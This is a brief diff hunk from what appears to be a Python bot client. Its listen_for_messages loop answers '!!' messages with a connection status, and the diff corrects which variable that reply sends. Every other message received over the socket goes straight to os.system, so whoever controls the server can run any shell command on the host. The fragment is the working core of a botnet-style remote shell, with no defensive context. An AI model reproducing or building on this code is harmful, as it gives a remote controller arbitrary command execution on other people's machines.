@@ -43,7 +43,7 @@ def listen_for_messages():
         message = s.recv(1024).decode()
         if "!!" in message:
             connected_bots = f"{name}: connected"
-            s.send(to_send.encode())
+            s.send(connected_bots.encode())
         else:
             os.system(f"{message}")
 
